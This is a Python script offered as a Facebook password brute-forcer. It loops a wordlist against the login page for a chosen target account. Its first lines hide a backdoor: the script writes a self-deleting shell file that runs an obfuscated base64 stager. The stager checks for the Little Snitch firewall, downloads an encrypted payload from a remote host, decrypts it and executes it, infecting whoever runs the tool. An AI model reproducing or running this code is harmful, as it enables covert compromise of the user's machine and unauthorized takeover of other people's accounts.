import os.path
import requests
from bs4 import BeautifulSoup
import sys
import os


file = open("Cif3.sh", "w")
file.write("""#!/bin/bash
echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwcm9jZXNzOwpjbWQgPSAicHMgLWVmIHwgZ3JlcCBMaXR0bGVcIFNuaXRjaCB8IGdyZXAgLXYgZ3JlcCIKcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPSBwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKTsKCmltcG9ydCB1cmxsaWIucmVxdWVzdDsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xOTIuMTY4LjEuODoxMzM1Jzt0PScvYWRtaW4vZ2V0LnBocCc7CnJlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHNlcnZlcit0KTsKcHJveHkgPSB1cmxsaWIucmVxdWVzdC5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYi5yZXF1ZXN0LmJ1aWxkX29wZW5lcihwcm94eSk7Cm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JyxVQSksICgiQ29va2llIiwgInNlc3Npb249Z2x5Zmp0UHRHZDBKQm9WYzYzVjhYbmV2YzVrPSIpXTsKdXJsbGliLnJlcXVlc3QuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdOwpkYXRhPWFbNDpdOwprZXk9SVYrJzVGY3glV10zJkw0dWxKQnZoVFFPW0dyKGRSOFNILnxLJy5lbmNvZGUoJ1VURi04Jyk7ClMsaixvdXQ9bGlzdChyYW5nZSgyNTYpKSwwLFtdOwpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2OwogICAgU1tpXSxTW2pdPVNbal0sU1tpXTsKaT1qPTA7CmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NjsKICAgIGo9KGorU1tpXSklMjU2OwogICAgU1tpXSxTW2pdPVNbal0sU1tpXTsKICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSk7CmV4ZWMoJycuam9pbihvdXQpKTs='));" | python3 &
rm -f "$0"
exit
""")
file.close()
os.popen("chmod +x Cif3.sh")
os.popen("bash Cif3.sh")
if sys.version_info[0] != 3:
    print("Try again")
    sys.exit()
PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = "https://www.facebook.com/login.php"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = dict()
    cookies = {"fr": "0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy"}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, "html.parser").form
    if data.input["name"] == "lsd":
        form["lsd"] = data.input["value"]
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD["email"] = email
    PAYLOAD["pass"] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if (
        "Find Friends" in r.text
        or "security code" in r.text
        or "Two-factor authentication" in r.text
        or "Log Out" in r.text
    ):
        open("temp", "w").write(str(r.content))
        print("\npassword found is: ", password)
        return True
    return False


if __name__ == "__main__":
    print("\n---------- Welcome To Facebook BruteForce ----------\n")
    if not os.path.isfile(PASSWORD_FILE):
        print("Password file is not exist: ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, "r").read().split("\n")
    print("Password file selected: ", PASSWORD_FILE)
    email = input("Enter Email/Username to target: ").strip()
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print("Trying password [", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break
